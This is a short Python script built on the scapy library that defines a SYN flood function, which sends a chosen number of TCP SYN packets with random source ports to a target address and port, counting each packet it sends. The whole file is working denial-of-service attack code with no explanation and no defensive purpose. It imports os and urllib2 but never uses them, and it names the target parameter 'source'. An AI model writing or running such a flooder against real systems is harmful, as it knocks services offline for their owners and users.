#!/usr/bin/python
import sys
import random
from scapy.all import *
import os
import urllib2





def syn_flood(source,port,count):
	iterationCount = 0 # variable used to control the while loop for the amount of times a packet is sent.
	while iterationCount < count:
		a=IP(dst=source)/TCP(flags="S", sport=RandShort(), dport=port) # Creates the packet and assigns it to variable a
		send(a,verbose=0) # Sends the Packet
		iterationCount = iterationCount + 1
		print(str(iterationCount) + " Packet Sent")
	print("All packets successfully sent.")
